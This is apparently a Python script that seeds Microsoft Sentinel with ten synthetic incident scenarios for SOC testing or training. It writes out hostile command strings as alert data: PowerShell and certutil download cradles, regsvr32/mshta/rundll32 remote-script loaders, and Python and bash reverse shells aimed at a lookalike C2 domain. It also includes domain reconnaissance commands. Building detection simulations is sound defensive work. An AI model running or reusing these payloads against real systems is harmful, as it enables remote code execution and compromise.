import uuid
import logging
import base64
import random
import urllib.parse
import json
from sentinel_api import _request, _get_base, API_VERSION
from sentinel_auth import get_auth_headers
from dotenv import load_dotenv

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

CAMPAIGN_SHARED_IOCS = {
    "c2_domain": "api.github-user-content.com",
    "attacker_ip": "45.33.32.156", # Scanme Nmap
    "malicious_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" # Example hash
}

def generate_obfuscated_payload(ip: str, domain: str, profile: list[int]) -> str:
    def p1():
        cmd = f"IEX (New-Object Net.WebClient).DownloadString('http://{domain}/malware.ps1')"
        return f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {base64.b64encode(cmd.encode()).decode()}"
    def p2():
        parts = ip.split('.')
        return f"curl -A 'Mozilla/5.0' http://0x{int(parts[0]):02x}.0x{int(parts[1]):02x}.0x{int(parts[2]):02x}.0x{int(parts[3]):02x}/stage2.sh | bash"
    def p3():
        return f"cmd.exe /c certutil.exe -urlcache -split -f https://{domain}/update.exe %TEMP%\\svchost.exe && %TEMP%\\svchost.exe"
    def p4():
        parts = ip.split('.')
        dec_ip = (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])
        return f"wget http://{dec_ip}/config.json -O /tmp/config.json"
    def p5():
        cmd = f"Invoke-WebRequest -Uri http://{domain}/shell.exe -OutFile $env:TEMP\\shell.exe"[::-1]
        return f"powershell -c \"$rev='{cmd}'; $cmd=-join($rev.ToCharArray()|Reverse); Invoke-Expression $cmd\""
    def p6():
        return f"wmic /node:{ip} process call create \"regsvr32.exe /s /n /u /i:http://{domain}/payload.sct scrobj.dll\""
    def p7():
        return f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
    def p8():
        return f"mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:http://{domain}/macro.vbs\"\")\"))"
    def p9():
        return f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://{domain}/payload.wsc\").Exec();"
    def p10():
        return f"bash -c 'exec 5<>/dev/tcp/{ip}/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'"
    def p11():
        return "A" * 4000 + " | grep something"
    def p12():
        return "nltest /domain_trusts"
    def p13():
        return "net group \"Domain Admins\" /domain"
    def p14():
        return "whoami /all"
    def p15():
        return f"https://{domain}/personal/user_documents/Shared/Project_X_Financials.xlsx"

    payloads = {1: p1, 2: p2, 3: p3, 4: p4, 5: p5, 6: p6, 7: p7, 8: p8, 9: p9, 10: p10, 11: p11, 12: p12, 13: p13, 14: p14, 15: p15}
    
    if not profile:
        return ""
        
    choice = random.choice(profile)
    return payloads[choice]()

# Domains & IPs
PUNYCODE_DOMAINS = ["xn--googl-fsa.com", "xn--microsft-zxa.com", "xn--paypa-m1a.com"]
LEGIT_DOMAINS = ["microsoft.com", "sharepoint.com", "onedrive.live.com"]
RANDOM_DOMAINS = [
    "rnicrosoft-update.com", "azure-auth-sso.net",
    "login.microsoftonline.com.secure-auth-xyz.info",
    "windows-defender-update.xyz", "aws-s3-bucket-storage.net", 
    "cloudflare-cdn-delivery.org", "slack-api-webhook.com", "zoom-video-confernce.net"
]

HOSTNAMES = [
    "DESKTOP-A1B2C3D", "SRV-DC-01", "HR-WKSTN-404", "EXCHANGE-PROD", 
    "SQL-CLUSTER-02", "DEV-LINUX-BUILD", "DMZ-WEBSERVER-1", 
    "CEO-LAPTOP-MAC", "KUBERNETES-NODE-3", "DOCKER-HOST-ALPHA"
]

def generate_random_ip(is_internal=False):
    if is_internal:
        return f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
    return f"{random.randint(11, 200)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

SCENARIOS = [
    {
        "id": 1,
        "name": "Suspicious certutil/regsvr32/wmic execution chain with encoded payload delivery",
        "description": (
            "Multiple LOLBin processes were observed executing in rapid succession on the target host. "
            "certutil.exe was used to download an executable from an external URI, followed by regsvr32.exe "
            "loading a remote scriptlet (.sct) via COM, and wmic.exe spawning a child process on a network-adjacent "
            "host. The downloaded binary has no Authenticode signature and its SHA256 hash is not present in any "
            "known threat intelligence feed. The executing user account is a domain administrator. This pattern is "
            "consistent with pre-ransomware staging, however the same certutil pattern has been observed in this "
            "environment by the IT automation team for legitimate software distribution. The wmic lateral call "
            "targets a host that is part of the standard patch management ring."
        ),
        "severity": "High",
        "tactics": ["Execution", "Impact", "LateralMovement"],
        "entity_mappings": ["IP", "Host", "FileHash", "DNS"],
        "obfuscation_profile": [3, 6, 9],
        "ip_mode": "public",
        "domain_pool": RANDOM_DOMAINS,
        "alert_count": 10,
        "special": None
    },
    {
        "id": 2,
        "name": "Anomalous OAuth token replay from IDN-homograph domain after MFA completion",
        "description": (
            "A successful interactive sign-in was completed with MFA satisfaction from a browser user-agent, "
            "immediately followed by a non-interactive token refresh from a different IP address and a Python "
            "requests/2.31.0 user-agent within 4 seconds. The initial authentication redirected through an "
            "internationalized domain name (IDN) containing homograph characters visually indistinguishable from "
            "the legitimate tenant login portal. The secondary IP geolocates to a residential proxy provider in a "
            "country where the organization has no operations. Session cookies were replayed to access Exchange "
            "Online and enumerate Global Admin role members via Microsoft Graph. However, the user's UPN matches "
            "a recently onboarded contractor whose MFA registration was completed 72 hours ago, and their "
            "authentication pattern baseline has not yet been established."
        ),
        "severity": "High",
        "tactics": ["InitialAccess", "CredentialAccess", "Persistence"],
        "entity_mappings": ["IP", "Host", "DNS", "Account"],
        "obfuscation_profile": [1, 8, 5],
        "ip_mode": "public",
        "domain_pool": PUNYCODE_DOMAINS,
        "alert_count": 10,
        "special": None
    },
    {
        "id": 3,
        "name": "Crontab modification with obfuscated wget/curl to non-standard IP notation endpoints",
        "description": (
            "A crontab entry was created on a Linux build server scheduling execution of a shell script every "
            "5 minutes. The script uses wget with a decimal-encoded IP address (integer notation) to download "
            "a binary to /tmp, then redirects stdin/stdout/stderr through a bash /dev/tcp socket to a second "
            "IP address expressed in hexadecimal octet notation. The downloaded binary spawns a process named "
            "'kworker' which is consuming 98% CPU across all cores. The target host is an ephemeral CI/CD build "
            "runner that is routinely destroyed and recreated. The wget user-agent string has been spoofed to "
            "mimic a Mozilla browser. Network telemetry shows sustained outbound connections on port 443 to the "
            "decimal IP, but TLS certificate inspection reveals a self-signed cert with CN=localhost issued today."
        ),
        "severity": "Medium",
        "tactics": ["Execution", "Persistence", "CommandAndControl"],
        "entity_mappings": ["IP", "Host", "DNS"],
        "obfuscation_profile": [2, 4, 10],
        "ip_mode": "public",
        "domain_pool": RANDOM_DOMAINS,
        "alert_count": 10,
        "special": None
    },
    {
        "id": 4,
        "name": "Anomalous bulk file access pattern on SharePoint by privileged service account",
        "description": (
            "A service account (svc-backup@contoso.com) with SharePoint Sites.Read.All permissions accessed "
            "4,217 documents across 14 site collections within a 23-minute window via Microsoft Graph API. "
            "All accessed files are classified as 'Confidential' under Microsoft Information Protection labels. "
            "The access originated from an internal IP (RFC 1918) registered to the on-premises data center. "
            "The service account is the organization's authorized nightly backup agent which runs on a scheduled "
            "task, but this execution occurred at 14:32 UTC — 8 hours outside its normal 22:00-23:00 window. "
            "The service account password was rotated 6 hours ago via Azure Key Vault by a Global Administrator. "
            "All destination URLs resolve to legitimate microsoft.com and sharepoint.com endpoints. No malicious "
            "hashes or external IPs are present in this activity."
        ),
        "severity": "Low",
        "tactics": ["Collection", "Exfiltration"],
        "entity_mappings": ["Account", "Host"],
        "obfuscation_profile": [15],
        "ip_mode": "internal",
        "domain_pool": LEGIT_DOMAINS,
        "alert_count": 10,
        "special": None
    },
    {
        "id": 5,
        "name": "Sequential domain trust enumeration and privileged group discovery from non-admin workstation",
        "description": (
            "A standard user account on a non-administrative workstation executed nltest /domain_trusts, "
            "net group 'Domain Admins' /domain, and whoami /all within a 90-second window. No outbound "
            "network connections were established during or after execution. The process tree shows all "
            "commands spawned under cmd.exe which was launched from explorer.exe (interactive logon). "
            "The workstation is in an OU with restricted GPO, and the user has no history of running "
            "administrative tools. However, the same user submitted an IT helpdesk ticket 2 hours ago "
            "requesting domain trust information for a cross-forest migration project. No PowerShell, "
            "no encoded commands, no file writes — purely native Windows reconnaissance binaries."
        ),
        "severity": "Informational",
        "tactics": ["Discovery", "Reconnaissance"],
        "entity_mappings": ["Host"],
        "obfuscation_profile": [12, 13, 14],
        "ip_mode": "internal",
        "domain_pool": [""],
        "alert_count": 10,
        "special": None
    },
    {
        "id": 6,
        "name": "Process injection via reflective DLL loading with multi-layer encoded command buffer",
        "description": (
            "A process was observed loading an unsigned DLL via reflective injection into a legitimate "
            "svchost.exe instance. The command line argument contains a multi-layer encoded payload: "
            "the outermost layer is base64, which decodes to a URL-encoded string, which further decodes "
            "to a reversed PowerShell command. The total command buffer exceeds 4000 characters. The injecting "
            "process has a PID that collides with a legitimate Windows service, and the parent process chain "
            "contains Unicode characters in the executable path that may indicate path traversal or "
            "internationalized filesystem abuse. Memory forensics from the EDR agent shows the injected "
            "code region has RWX permissions and contains shellcode patterns, but the initial dropper binary "
            "is signed by a revoked certificate that was valid at the time of compilation."
        ),
        "severity": "High",
        "tactics": ["Execution", "DefenseEvasion", "PrivilegeEscalation"],
        "entity_mappings": ["IP", "Host", "FileHash", "DNS"],
        "obfuscation_profile": [11],
        "ip_mode": "public",
        "domain_pool": RANDOM_DOMAINS,
        "alert_count": 10,
        "special": "malformed"
    },
    {
        "id": 7,
        "name": "Behavioral anomaly cluster — heuristic correlation of low-fidelity signals",
        "description": (
            "Multiple low-confidence heuristic detections have been correlated by the UEBA engine into a "
            "single incident. Individual signals include: (1) a logon session duration 3.2 standard deviations "
            "above the user's 30-day baseline, (2) access to a resource category the user has never accessed "
            "before, (3) a browser fingerprint change mid-session, and (4) an MFA push notification accepted "
            "within 0.8 seconds of issuance (possible MFA fatigue or automated acceptance). No specific IP "
            "addresses, file hashes, URLs, or domain names were captured in the raw telemetry — all signals "
            "are behavioral deltas relative to the user's baseline. The UEBA risk score crossed the alerting "
            "threshold of 85/100 but each individual signal scores below 40. The user is flagged as a VIP "
            "(C-suite executive) with a historically volatile activity pattern due to international travel."
        ),
        "severity": "Medium",
        "tactics": [],
        "entity_mappings": [],
        "obfuscation_profile": [],
        "ip_mode": "public",
        "domain_pool": [""],
        "alert_count": 10,
        "special": "zero_entity"
    },
    {
        "id": 8,
        "name": "Encoded PowerShell download cradle from newly-registered domain via HTA handler",
        "description": (
            "An email containing an HTML attachment was opened by a user, triggering mshta.exe to execute "
            "an inline VBScript that spawned powershell.exe with a base64-encoded command. The decoded "
            "command downloads a second-stage payload from a domain registered 48 hours ago with privacy-protected "
            "WHOIS. The PowerShell process runs under the user's context with no elevation. The downloaded "
            "payload is a .NET assembly that loads directly into memory via System.Reflection without touching "
            "disk. DNS resolution for the staging domain returns an IP address hosted on a major cloud provider "
            "that also hosts 12,000+ legitimate SaaS applications. The user's mailbox rules show no forwarding "
            "anomalies, and the email passed SPF/DKIM/DMARC validation against the sender's domain."
        ),
        "severity": "High",
        "tactics": ["InitialAccess", "Execution", "DefenseEvasion"],
        "entity_mappings": ["IP", "Host", "FileHash", "DNS"],
        "obfuscation_profile": [1, 7, 8],
        "ip_mode": "public",
        "domain_pool": [CAMPAIGN_SHARED_IOCS["c2_domain"]],
        "alert_count": 10,
        "special": "campaign_1"
    },
    {
        "id": 9,
        "name": "WMI remote process creation with credential delegation across trust boundary",
        "description": (
            "A compromised host is using WMI to spawn processes on multiple internal hosts across a forest "
            "trust boundary. The remote processes invoke regsvr32.exe with a /i flag pointing to an external "
            "scriptlet URL, followed by curl commands downloading secondary payloads using hexadecimal IP "
            "notation. The source host authenticated using Kerberos TGT delegation (unconstrained delegation "
            "is enabled on this server). Internal-to-internal traffic between the source (10.0.x.x) and "
            "targets (10.0.y.y) was previously unrestricted by NSG rules. The attacking account is a service "
            "account with 'Trusted for Delegation' set, which is expected for the application it services. "
            "EDR telemetry shows the service account's NTLM hash was used for pass-the-hash authentication "
            "against two domain controllers that are not in the account's normal authentication scope."
        ),
        "severity": "High",
        "tactics": ["LateralMovement", "CredentialAccess", "Persistence", "PrivilegeEscalation"],
        "entity_mappings": ["IP", "Host", "FileHash", "DNS"],
        "obfuscation_profile": [6, 2],
        "ip_mode": "mixed",
        "domain_pool": [CAMPAIGN_SHARED_IOCS["c2_domain"]],
        "alert_count": 10,
        "special": "campaign_2"
    },
    {
        "id": 10,
        "name": "DNS TXT record exfiltration with concurrent HTTPS beaconing to shared C2 infrastructure",
        "description": (
            "A host is generating DNS TXT queries at a sustained rate of 2 queries/second to subdomains of "
            "a domain that resolves to the same IP address observed in prior lateral movement activity. The "
            "subdomain labels contain base32-encoded fragments consistent with data exfiltration over DNS. "
            "Simultaneously, the same host is making HTTPS POST requests at regular 60-second intervals to "
            "the same IP on port 443 with a JA3 fingerprint matching known Cobalt Strike Beacon malleable C2 "
            "profiles. The POST body sizes vary between 4KB and 2MB, suggesting staged file uploads. Prior to "
            "this activity, the host executed a PowerShell command that recursively enumerated all .docx, .xlsx, "
            "and .pdf files in mapped network drives and compressed them into a password-protected 7z archive. "
            "The archive was written to a directory named 'C:\\ProgramData\\Microsoft\\Crypto\\RSA\\temp' — a path "
            "that mimics legitimate Windows certificate storage. Outbound traffic volume from this host has "
            "increased 340% compared to its 7-day rolling average."
        ),
        "severity": "High",
        "tactics": ["Exfiltration", "Collection", "CommandAndControl"],
        "entity_mappings": ["IP", "Host", "FileHash", "DNS"],
        "obfuscation_profile": [10, 5],
        "ip_mode": "public",
        "domain_pool": [CAMPAIGN_SHARED_IOCS["c2_domain"]],
        "alert_count": 10,
        "special": "campaign_3"
    }
]

def generate_scenario_datatable(scenario: dict) -> str:
    rows = []
    
    if scenario["special"] == "zero_entity":
        narratives = [
            "UEBA: Session anomaly score 87/100. Logon duration 4.1h vs 1.2h baseline (3.2σ). Resource category 'Azure Key Vault Secrets' accessed for first time. Browser fingerprint changed mid-session (canvas hash delta). MFA push accepted in 0.8s.",
            "UEBA: Impossible travel detected. Authentication from Zurich (10:04 UTC) followed by Seattle (10:11 UTC). VPN gateway logs show no active tunnel. Risk score elevated to 91/100. User is C-suite with historically volatile travel pattern.",
            "UEBA: Anomalous mail forwarding rule created. Inbox rule 'FW-Archive' forwards all mail matching 'invoice OR payment OR wire' to external address. Rule created via Outlook REST API, not OWA. No prior forwarding rules on this mailbox.",
            "UEBA: Privilege escalation sequence. User added self to Azure AD role 'Application Administrator' via PIM eligible activation without justification text. Followed by app registration creating new client secret on LOB application.",
            "UEBA: Data exfiltration heuristic. 847 files downloaded from Teams channels in 12 minutes via Graph API. File types: .pptx (312), .docx (289), .xlsx (246). Total volume 2.3GB. User normally downloads <10 files/week.",
            "UEBA: Off-hours interactive logon. RDP session established at 03:47 local time from corporate VPN. User has no recorded logons between 00:00-06:00 in 180-day history. Session performed 14 failed sudo attempts on Linux jump host.",
            "UEBA: Lateral account usage. Service account SPN was used for interactive logon for the first time. Kerberos TGT requested from a workstation not in the accounts authorized host list. Account is flagged as Tier-0 asset.",
            "UEBA: Consent grant anomaly. User consented to a third-party OAuth application requesting Mail.ReadWrite and Files.ReadWrite.All scopes. Application publisher is unverified. Tenant policy allows user consent for low-risk apps only.",
            "UEBA: Geofence violation. Authentication from IP geolocating to embargoed jurisdiction. User has active conditional access policy blocking this region but authentication succeeded via legacy protocol bypass (ActiveSync).",
            "UEBA: MFA fatigue pattern. 14 MFA push notifications sent in 3 minutes. 13 denied, 1 approved. Approved notification originated from a different device than the authentication request source."
        ]
        for i in range(scenario["alert_count"]):
            narrative = narratives[i % len(narratives)]
            narrative_escaped = narrative.replace("'", "\\'")
            rows.append(f"now(), '', '', '', '', '', '{narrative_escaped}'")
    else:
        for _ in range(scenario["alert_count"]):
            if scenario["ip_mode"] == "public":
                ip = generate_random_ip(is_internal=False)
            elif scenario["ip_mode"] == "internal":
                ip = generate_random_ip(is_internal=True)
            else: # mixed
                ip = generate_random_ip(is_internal=random.choice([True, False]))
                
            if scenario.get("special") and scenario["special"].startswith("campaign"):
                ip = CAMPAIGN_SHARED_IOCS["attacker_ip"] if random.random() > 0.5 else ip
                hash_val = CAMPAIGN_SHARED_IOCS["malicious_hash"]
                domain = CAMPAIGN_SHARED_IOCS["c2_domain"]
            else:
                hash_val = "".join(random.choices("0123456789abcdef", k=64))
                domain = random.choice(scenario["domain_pool"]) if scenario["domain_pool"] else ""
                
            hostname = random.choice(HOSTNAMES)
            if scenario["special"] == "malformed":
                hostname += " \U0001f600\U0001f4a9 malformed_" + "".join(random.choices("!@#$%^&*()", k=5))
                
            payload = generate_obfuscated_payload(ip, domain, scenario["obfuscation_profile"])
            if scenario["special"] == "malformed":
                payload = base64.b64encode(urllib.parse.quote(payload).encode()).decode() + "GARBAGE_" * 50
                
            payload_escaped = payload.replace("'", "\\'")
            
            rows.append(f"now(), '{ip}', '{hostname}', 'SHA256', '{hash_val}', '{domain}', '{payload_escaped}'")
            
    kql = (
        "let events = datatable(TimeGenerated:datetime, AttackerIP:string, TargetHost:string, HashType:string, MaliciousHash:string, C2Domain:string, EncodedPayload:string)\n"
        "[\n    " + ",\n    ".join(rows) + "\n];\nevents"
    )
    return kql

def build_rule_body(scenario: dict, rule_id: str, kql_query: str) -> dict:
    entity_mappings = []
    
    if "IP" in scenario["entity_mappings"]:
        entity_mappings.append({
            "entityType": "IP",
            "fieldMappings": [{"identifier": "Address", "columnName": "AttackerIP"}]
        })
    if "Host" in scenario["entity_mappings"]:
        entity_mappings.append({
            "entityType": "Host",
            "fieldMappings": [{"identifier": "HostName", "columnName": "TargetHost"}]
        })
    if "FileHash" in scenario["entity_mappings"]:
        entity_mappings.append({
            "entityType": "FileHash",
            "fieldMappings": [{"identifier": "Algorithm", "columnName": "HashType"}, {"identifier": "Value", "columnName": "MaliciousHash"}]
        })
    if "DNS" in scenario["entity_mappings"]:
        entity_mappings.append({
            "entityType": "DNS",
            "fieldMappings": [{"identifier": "DomainName", "columnName": "C2Domain"}]
        })
    if "Account" in scenario["entity_mappings"]:
        entity_mappings.append({
            "entityType": "Account",
            "fieldMappings": [{"identifier": "Name", "columnName": "TargetHost"}]
        })
        
    return {
        "kind": "Scheduled",
        "properties": {
            "displayName": scenario["name"],
            "description": scenario["description"],
            "severity": scenario["severity"],
            "enabled": True,
            "query": kql_query,
            "queryFrequency": "PT5M",
            "queryPeriod": "PT5M",
            "triggerOperator": "GreaterThan",
            "triggerThreshold": 0,
            "suppressionDuration": "PT5H",
            "suppressionEnabled": False,
            "tactics": scenario["tactics"],
            "incidentConfiguration": {
                "createIncident": True,
                "groupingConfiguration": {
                    "enabled": True,
                    "reopenClosedIncident": False,
                    "lookbackDuration": "PT5M",
                    "matchingMethod": "AnyAlert",
                    "groupByEntities": [],
                    "groupByAlertDetails": [],
                    "groupByCustomDetails": []
                }
            },
            "eventGroupingSettings": {
                "aggregationKind": "AlertPerResult"
            },
            "entityMappings": entity_mappings,
            "customDetails": {
                "EncodedPayload": "EncodedPayload"
            },
            "alertDetailsOverride": {
                "alertDisplayNameFormat": f"{scenario['name']} — {{{{TargetHost}}}}",
                "alertDescriptionFormat": "Observed payload on affected host:\\n{{EncodedPayload}}"
            }
        }
    }


def create_mock_incidents():
    load_dotenv()
    headers = get_auth_headers()
    
    logger.info("Initializing creation of 10 Scenario-Driven Analytics Rules...")
    
    for scenario in SCENARIOS:
        rule_id = str(uuid.uuid4())
        try:
            url = f"{_get_base()}/alertRules/{rule_id}"
        except EnvironmentError as e:
            logger.error(e)
            return
            
        params = {"api-version": "2023-02-01"}
        kql_query = generate_scenario_datatable(scenario)
        body = build_rule_body(scenario, rule_id, kql_query)
        
        try:
            response = _request("PUT", url, headers=headers, params=params, json=body)
            if response.status_code in (200, 201):
                logger.info(f"✅ Created Rule {scenario['id']}: {scenario['name']}")
            else:
                logger.error(f"❌ Failed to create Rule {scenario['id']}. Status: {response.status_code}")
                logger.error(response.text)
        except Exception as e:
            logger.error(f"❌ Failed to create Rule {scenario['id']}: {e}")
            resp = getattr(e, 'response', None)
            if resp is not None:
                logger.error(f"Response body: {resp.text}")

    logger.info("\\n" + "="*80)
    logger.info("🎯 All 10 Scenario Analytics Rules have been successfully created via the Sentinel REST API!")
    logger.info("⚙️ Mechanism: Sentinel executes Scheduled Analytics Rules every 5 minutes.")
    logger.info("⏳ Wait ~5 minutes. Sentinel will run these rules and native Incidents will magically appear.")
    logger.info("⚠️ WARNING: These rules will fire every 5 minutes. Delete them in 'Sentinel > Analytics' when done.")
    logger.info("="*80)

if __name__ == "__main__":
    create_mock_incidents()
